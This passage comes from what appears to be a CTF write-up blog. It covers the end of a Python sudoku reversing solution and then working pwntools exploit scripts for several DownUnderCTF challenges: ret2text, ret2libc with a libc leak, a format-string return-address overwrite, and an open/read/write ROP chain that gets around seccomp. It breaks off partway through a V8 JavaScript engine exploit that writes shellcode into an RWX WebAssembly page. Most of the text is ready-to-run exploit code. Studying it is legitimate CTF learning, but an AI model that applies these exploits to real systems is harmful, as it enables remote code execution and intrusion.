28)来指定:\n那就是-wwwwwdddddddddsssss-aaaaaaaaasssssssddddddddd-dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw\n在确定一下迷宫的顺序为:\n4312\n那么输入的就是:\n4312-wwwwwdddddddddsssss-aaaaaaaaasssssssddddddddd-dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw\n那么就出flag啦…\n\nfu!k_py通过饭编译pyc文件\n解密网站: http://www.llang.net/sudoku/calsudoku.html\n或者: \nuncompyle6 fu!k.pyc &gt; fu!k.py\n\n\n\n# uncompyle6 version 3.7.4# Python bytecode 2.7 (62211)# Decompiled from: Python 3.8.3 (default, May 17 2020, 18:15:42) # [GCC 10.1.0]# Embedded file name: test233_ol.py# Compiled at: 2020-03-20 13:22:50(lambda __g, __print: [ [ (lambda __after: [ (lambda __after: (__print(&#x27;Error len!&#x27;), (exit(), __after())[1])[1] if len(input) != 87 else __after())(lambda : [ [ [ [ (lambda __after: (__print(&#x27;Error fmt!&#x27;), (exit(0), __after())[1])[1] if fmt1 != &#x27;flag&#123;&#x27; or fmt2 != &#x27;&#125;&#x27; else __after())(lambda : (d.append(context[0:9]), (d.append(context[9:18]), (d.append(context[18:27]), (d.append(context[27:36]), (d.append(context[36:45]), (d.append(context[45:54]), (d.append(context[54:63]), (d.append(context[63:72]), (d.append(context[72:81]), [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[0][2] != &#x27;5&#x27; or d[0][3] != &#x27;3&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[1][0] != &#x27;8&#x27; or d[1][7] != &#x27;2&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[2][1] != &#x27;7&#x27; or d[2][4] != &#x27;1&#x27; or d[2][6] != &#x27;5&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[3][0] != &#x27;4&#x27; or d[3][5] != &#x27;5&#x27; or d[3][6] != &#x27;3&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[4][1] != &#x27;1&#x27; or d[4][4] != &#x27;7&#x27; or d[4][8] != &#x27;6&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[5][2] != &#x27;3&#x27; or d[5][3] != &#x27;2&#x27; or d[5][7] != &#x27;8&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[6][1] != &#x27;6&#x27; or d[6][3] != &#x27;5&#x27; or d[6][8] != &#x27;9&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[7][2] != &#x27;4&#x27; or d[7][7] != &#x27;3&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if d[8][5] != &#x27;9&#x27; or d[8][6] != &#x27;7&#x27; else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if check(h1) != 45 or check(h2) != 45 or check(h3) != 45 or check(h4) != 45 or check(h5) != 45 or check(h6) != 45 or check(h7) != 45 or check(h8) != 45 or check(h9) != 45 else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if check(l1) != 45 or check(l2) != 45 or check(l3) != 45 or check(l4) != 45 or check(l5) != 45 or check(l6) != 45 or check(l7) != 45 or check(l8) != 45 or check(l9) != 45 else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if check(k1) != 45 or check(k2) != 45 or check(k3) != 45 or check(k4) != 45 or check(k5) != 45 or check(k6) != 45 or check(k7) != 45 or check(k8) != 45 or check(k9) != 45 else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if check1(h1) != 1 or check1(h2) != 1 or check1(h3) != 1 or check1(h4) != 1 or check1(h5) != 1 or check1(h6) != 1 or check1(h7) != 1 or check1(h8) != 1 or check1(h9) != 1 else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if check1(l1) != 1 or check1(l2) != 1 or check1(l3) != 1 or check1(l4) != 1 or check1(l5) != 1 or check1(l6) != 1 or check1(l7) != 1 or check1(l8) != 1 or check1(l9) != 1 else __after())(lambda : (lambda __after: (__print(&#x27;Error!&#x27;), (exit(), __after())[1])[1] if check1(k1) != 1 or check1(k2) != 1 or check1(k3) != 1 or check1(k4) != 1 or check1(k5) != 1 or check1(k6) != 1 or check1(k7) != 1 or check1(k8) != 1 or check1(k9) != 1 else __after())(lambda : (__print(&#x27;Yes! You got it!&#x27;), __after())[1]))))))))))))))) for __g[&#x27;k9&#x27;] in [context[60] + context[61] + context[62] + context[69] + context[70] + context[71] + context[78] + context[79] + context[80]] ][0] for __g[&#x27;k8&#x27;] in [context[57] + context[58] + context[59] + context[66] + context[67] + context[68] + context[75] + context[76] + context[77]] ][0] for __g[&#x27;k7&#x27;] in [context[54] + context[55] + context[56] + context[63] + context[64] + context[65] + context[72] + context[73] + context[74]] ][0] for __g[&#x27;k6&#x27;] in [context[33] + context[34] + context[35] + context[42] + context[43] + context[44] + context[51] + context[52] + context[53]] ][0] for __g[&#x27;k5&#x27;] in [context[30] + context[31] + context[32] + context[39] + context[40] + context[41] + context[48] + context[49] + context[50]] ][0] for __g[&#x27;k4&#x27;] in [context[27] + context[28] + context[29] + context[36] + context[37] + context[38] + context[45] + context[46] + context[47]] ][0] for __g[&#x27;k3&#x27;] in [context[6] + context[7] + context[8] + context[15] + context[16] + context[17] + context[24] + context[25] + context[26]] ][0] for __g[&#x27;k2&#x27;] in [context[3] + context[4] + context[5] + context[12] + context[13] + context[14] + context[21] + context[22] + context[23]] ][0] for __g[&#x27;k1&#x27;] in [context[0] + context[1] + context[2] + context[9] + context[10] + context[11] + context[18] + context[19] + context[20]] ][0] for __g[&#x27;l9&#x27;] in [context[8] + context[17] + context[26] + context[35] + context[44] + context[53] + context[62] + context[71] + context[80]] ][0] for __g[&#x27;l8&#x27;] in [context[7] + context[16] + context[25] + context[34] + context[43] + context[52] + context[61] + context[70] + context[79]] ][0] for __g[&#x27;l7&#x27;] in [context[6] + context[15] + context[24] + context[33] + context[42] + context[51] + context[60] + context[69] + context[78]] ][0] for __g[&#x27;l6&#x27;] in [context[5] + context[14] + context[23] + context[32] + context[41] + context[50] + context[59] + context[68] + context[77]] ][0] for __g[&#x27;l5&#x27;] in [context[4] + context[13] + context[22] + context[31] + context[40] + context[49] + context[58] + context[67] + context[76]] ][0] for __g[&#x27;l4&#x27;] in [context[3] + context[12] + context[21] + context[30] + context[39] + context[48] + context[57] + context[66] + context[75]] ][0] for __g[&#x27;l3&#x27;] in [context[2] + context[11] + context[20] + context[29] + context[38] + context[47] + context[56] + context[65] + context[74]] ][0] for __g[&#x27;l2&#x27;] in [context[1] + context[10] + context[19] + context[28] + context[37] + context[46] + context[55] + context[64] + context[73]] ][0] for __g[&#x27;l1&#x27;] in [context[0] + context[9] + context[18] + context[27] + context[36] + context[45] + context[54] + context[63] + context[72]] ][0] for __g[&#x27;h9&#x27;] in [context[72:81]] ][0] for __g[&#x27;h8&#x27;] in [context[63:72]] ][0] for __g[&#x27;h7&#x27;] in [context[54:63]] ][0] for __g[&#x27;h6&#x27;] in [context[45:54]] ][0] for __g[&#x27;h5&#x27;] in [context[36:45]] ][0] for __g[&#x27;h4&#x27;] in [context[27:36]] ][0] for __g[&#x27;h3&#x27;] in [context[18:27]] ][0] for __g[&#x27;h2&#x27;] in [context[9:18]] ][0] for __g[&#x27;h1&#x27;] in [context[0:9]] ][0])[1])[1])[1])[1])[1])[1])[1])[1])[1]) for __g[&#x27;d&#x27;] in [[]] ][0] for __g[&#x27;context&#x27;] in [input[5:-1]] ][0] for __g[&#x27;fmt2&#x27;] in [input[(-1)]] ][0] for __g[&#x27;fmt1&#x27;] in [input[0:5]] ][0]) for __g[&#x27;input&#x27;] in [raw_input(&#x27;Input your flag:&#x27;)] ][0] if __name__ == &#x27;__main__&#x27; else __after())(lambda : None) for __g[&#x27;check1&#x27;], check1.__name__ in [(lambda arg: (lambda __l: [ (lambda __after: 0 if len(list(set(__l[&#x27;arg&#x27;]))) != 9 else 1)(lambda : None) for __l[&#x27;arg&#x27;] in [arg] ][0])(&#123;&#125;), &#x27;check1&#x27;)] ][0] for __g[&#x27;check&#x27;], check.__name__ in [(lambda arg: (lambda __l: [ sum(map(int, __l[&#x27;arg&#x27;])) for __l[&#x27;arg&#x27;] in [arg] ][0])(&#123;&#125;), &#x27;check&#x27;)] ][0])(globals(), __import__(&#x27;__builtin__&#x27;, level=0).__dict__[&#x27;print&#x27;])# okay decompiling fu!k.pyc\n\n\n\n\nd,l,h分别表示3x3块，列，行\n先判断列表的长度是否为9\ncheck求和\n\n是一个9x9的数独游戏，根据已知数据，求解未知就行\n将一下生成的内容导入到数独求解器中求解即可.\n# python script for sudoku# 数独求解# http://www.llang.net/sudoku/calsudoku.htmlc = 0d = [    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0],    [0, 0, 0, 0, 0, 0, 0, 0, 0]]d[0][2] = &#x27;5&#x27;d[0][3] = &#x27;3&#x27;d[1][0] = &#x27;8&#x27;d[1][7] = &#x27;2&#x27;d[2][1] = &#x27;7&#x27;d[2][4] = &#x27;1&#x27;d[2][6] = &#x27;5&#x27;d[3][0] = &#x27;4&#x27;d[3][5] = &#x27;5&#x27;d[3][6] = &#x27;3&#x27;d[4][1] = &#x27;1&#x27;d[4][4] = &#x27;7&#x27;d[4][8] = &#x27;6&#x27;d[5][2] = &#x27;3&#x27;d[5][3] = &#x27;2&#x27;d[5][7] = &#x27;8&#x27;d[6][1] = &#x27;6&#x27;d[6][3] = &#x27;5&#x27;d[6][8] = &#x27;9&#x27;d[7][2] = &#x27;4&#x27;d[7][7] = &#x27;3&#x27;d[8][5] = &#x27;9&#x27;d[8][6] = &#x27;7&#x27;for i in d:        l = &#x27;&#x27;        for j in i:                l += str(j)        print(l)\n\n\n\nlogan@arch:~ » python exp.py005300000800000020070010500400005300010070006003200080060500009004000030000009700000000000\n\n求得\n145327698839654127672918543496185372218473956753296481367542819984761235521839764\n\n即flag为flag{145327698839654127672918543496185372218473956753296481367542819984761235521839764}\n","categories":["ctf"],"tags":["pwn"]},{"title":"wp DownUnderCTF","url":"/2020/09/22/security/ctf/compitation/wp-down-under-ctf/","content":"DownUnderCTF PWN WPplatform\n1 [shellthis]There is a backdoor function named get_shell, then use ret2txt way to get shell\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;chal.duc.tf&quot;server_port = 30002# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tp = b&#x27;A&#x27; * 0x30\tp += p64(0)\tp += p64(elf.sym[&#x27;get_shell&#x27;])\tsl(p)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\n2 [return-to-what]This vuln \n__int64 vuln()&#123;  char v1; // [rsp+0h] [rbp-30h]  puts(&quot;Where would you like to return to?&quot;);  return gets(&amp;v1);&#125;\n\nThis vuln is a common stack overflow vuln, but no backdoor function we can use. we should leak libc base address before program end, then use ret2libc methond to call system function to get shell.\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;elf_path  = &#x27;./return-to-what&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;chal.duc.tf&quot;server_port = 30003# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tpop_rdi = 0x040122b\tret = 0x0401016\tp = b&#x27;A&#x27; * 0x30\tp += p64(0)\tp += p64(pop_rdi)\tp += p64(elf.got[&#x27;puts&#x27;])\tp += p64(elf.plt[&#x27;puts&#x27;])\tp += p64(0x4011AD)\tdb()\tsla(&#x27;?&#x27;, p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tli(&#x27;leak: &#x27; + hex(leak))\tlibc_base = leak - 0x0809c0\tli(&#x27;lib_base: &#x27; + hex(libc_base))\tsystem = libc_base + 0x04f440\tsh_str = libc_base + 0x1b3e9a\tp = b&#x27;A&#x27; * 0x30\tp += p64(0)\tp += p64(ret)\tp += p64(pop_rdi)\tp += p64(sh_str)\tp += p64(system)\tsla(&#x27;?&#x27;, p)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\n\n\n3 [echos]This program is a echo server, to print what you input. It’s easy to find a vulnerability in this program.It is format vul. we need use this vulnerability to leak main function return address in stack and leak libc base address.  Use libc database to search libc version by countent of leak then to download it. a one_gadget tool is very useful tool for searching one gadget in libc.  In order to get shell we should modify main ret address in stack as one gadget\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)#context.log_level=&#x27;debug&#x27;elf_path  = &#x27;./echos.bk&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;chal.duc.tf&quot;server_port = 30001# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\toffset = 8\tp = &#x27;%11$p,%27$p,%19$p&#x27;\tsl(p)\tru(&#x27;0x&#x27;)\tleak = int(r(12), 16)\telf_base = leak - (0x563d9cb8e8dd - 0x563d9cb8e000)\tli(&#x27;elf_base: &#x27; + hex(elf_base))\t# leak stack base\tru(&#x27;,0x&#x27;)\tleak = int(r(12), 16)\tli(&#x27;stack_leak: &#x27; + hex(leak))\tmain_ret = leak - (0x7ffc1f9e87e0 - 0x7ffc1f9e8708)\tli(&#x27;main_ret: &#x27; + hex(main_ret))\tru(&#x27;,0x&#x27;)\tleak = int(r(12), 16)\tli(&#x27;main_init_leak: &#x27; + hex(leak - 231))\tdb()\tlibc_base = leak - (0x7f7d13204b97 - 0x7f7d131e3000)\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tone_gadget = libc_base + 0x4f322\t\t\tp = &#x27;%&#x27; + str((one_gadget &amp; 0xFF0000) &gt;&gt; 16) + &#x27;c%10$hhn&#x27;\tp += &#x27;A&#x27; * 4\tp += p64(main_ret + 2) #0xF0000\tli(&#x27;one_gadget: &#x27; + hex(one_gadget))\t#db()\tsl(p)\tru(&#x27;AAAA&#x27;)\tp = &#x27;%&#x27; + str(one_gadget &amp; 0xFFFF) + &#x27;c%10$hn&#x27;\tp += &#x27;A&#x27; * 3\tp += p64(main_ret + 0) #0xF0000\tsl(p)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\n4 [return-to-whats-revenge]Same as before, there is a stack overflow  vulnerability in this program. but this program has a protection in sandbox function.  It is a seccomp rule to forbid some syscall. The sandbox function content as follows:\nfilter[24].code = 6;filter[24].jt = 0;filter[24].jf = 0;filter[0x18].k = 0;bpf_resolve_jumps(&amp;lab, filter, 0x19uLL);prog.len = 0x19;prog.filter = filter;prctl(0x26, 1LL, 0LL, 0LL, 0LL, *(_QWORD *)&amp;prog.len, filter);// PR_SET_NO_NEW_PRIVS, no execveprctl(0x16, 2LL, &amp;prog);\n\nbut this program I can’t use seccomp tool to dump the rule. so it has a bad syscall  when I use orw method to exploit this program, this rule cannot use open function to open file, must use syscall with specific value in regisger to realize open function, or it will call open syscall failed! That’s a place easily to make a mistake. \n​\tyou must create a open function syscall by yourself, or while calling open function in libc will be a bad syscall.\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;elf_path  = &#x27;./return-to-whats-revenge.bk&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;chal.duc.tf&quot;server_port = 30006# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tpop_rdi = 0x04019db\tret = 0x0401016\tbss = 0x404000 + 0x100\tp = b&#x27;A&#x27; * 0x30\tp += p64(0)\tp += p64(pop_rdi)\tp += p64(elf.got[&#x27;puts&#x27;])\tp += p64(elf.plt[&#x27;puts&#x27;])\tp += p64(0x4011DA)\tsla(&#x27;?&#x27;, p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tli(&#x27;leak: &#x27; + hex(leak))\tlibc_base = leak - 0x0809c0\tli(&#x27;lib_base: &#x27; + hex(libc_base))\tpop_rdx = libc_base + 0x1b96\tpop_rsi = libc_base + 0x23e6a\tpop_rax = libc_base + 0x439c8\tlibc_read = libc_base + 0x110070\tlibc_open = libc_base + 0x10fc40\tsyscall = libc_base + 0x11007f\tp = b&#x27;A&#x27; * 0x30\tp += p64(0)\t# read\tp += p64(pop_rdi) + p64(0x0)\tp += p64(pop_rsi) + p64(bss)\tp += p64(pop_rdx) + p64(0x100)\tp += p64(libc_read)\t# open\tp += p64(pop_rdi) + p64(bss)\tp += p64(pop_rsi) + p64(0)\tp += p64(pop_rdx) + p64(0)\tp += p64(pop_rax) + p64(2)\tp += p64(syscall)\t\t# read\tp += p64(pop_rdi) + p64(0x3)\tp += p64(pop_rsi) + p64(bss)\tp += p64(pop_rdx) + p64(0x40)\tp += p64(libc_read)\t# puts\tp += p64(pop_rdi)\tp += p64(bss)\tp += p64(elf.plt[&#x27;puts&#x27;])\t#db()\tsla(&#x27;?&#x27;, p)\t#p = b&#x27;/chal/flag.txt\\x00&#x27;\tp = b&#x27;flag.txt\\x00&#x27;\tsl(p);\t\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n5 [is-this-pwn-or-web]This puzzle is not a python sandbox escape, it is a javascript memory overflow.\njs exp/* This challenge is meant to be extremely hard. The way this exploit goes is * essentially as follows: * * Step 1: Read the patch.diff file to figure out the vulnerability * * Step 2: Use the vulnerability to get a corrupted float array. You can use *         this array to overwrite its own length to a very large number * * Step 3: Once you&#x27;ve done this, exploitation becomes (relatively) easy. There *         are loads of blog posts and other V8 exploits that you can use as *         a starting point. I&#x27;ll list some below. The only issue will be that *         V8 somewhat recently started shipping with pointer compression, and *         most blog posts / exploits will be made for challenges / vulns from *         V8 versions without pointer compression. * * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/ * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/ * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate) * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old) * * If you still have questions regarding this challenge, feel free to DM me  * anywhere. I&#x27;ll do my best to respond to queries! * * Discord: Faith#2563 * Twitter: @farazsth98 */// Helper functions setup to convert between doubles and numbers when neededvar buf = new ArrayBuffer(8);var f64_buf = new Float64Array(buf);var u32_buf = new Uint32Array(buf);function ftoi(val) &#123; // typeof(val) == float    f64_buf[0] = val;    return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) &lt;&lt; 32n); // Watch for little endianness&#125;function itof(val) &#123; // typeof(val) == BigInt    u32_buf[0] = Number(val &amp; 0xffffffffn);    u32_buf[1] = Number(val &gt;&gt; 32n);    return f64_buf[0];&#125;function hex(val) &#123; // typeof(val) == BigInt    return &quot;0x&quot; + val.toString(16);&#125;// We set up a web assembly page. This is mapped as an RWX page that we will// later write shellcode into.var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasm_mod = new WebAssembly.Module(wasm_code);var wasm_instance = new WebAssembly.Instance(wasm_mod);var f = wasm_instance.exports.main;console.log(&quot;[+] WebAssembly RWX page setup!&quot;);// Next, set up three arrays. These will be allocated one after another because// of the deterministic nature of the V8 heap. We corrupt the float array.// You can find their offsets relative to each other using GDB.//// While we do this, we also trigger the vulnerability to get a corrupted// float array in `float_arr`var float_arr = [1.1];float_arr = float_arr.slice(0); // Trigger the vulnvar addrof_arr = [&#123;&#125;, &#123;&#125;]; // Used for the addrof primitive latervar arb_read_arr = [1.1]; // Used for the arbitrary read primitive later// We set up an ArrayBuffer and a DataView. We will use these later to write // our shellcode into the RWX page.var buf = new ArrayBuffer(0x100);var dataview = new DataView(buf);console.log(&quot;[+] Corrupting float_arr&#x27;s length to 2048&quot;);// We need to store the current `elements` ptr before we corrupt the length// because corrupting the length also requires us to corrupt the `elements` ptr// in the processvar float_arr_elem = ftoi(float_arr[2]) &amp; 0xffffffffn;// 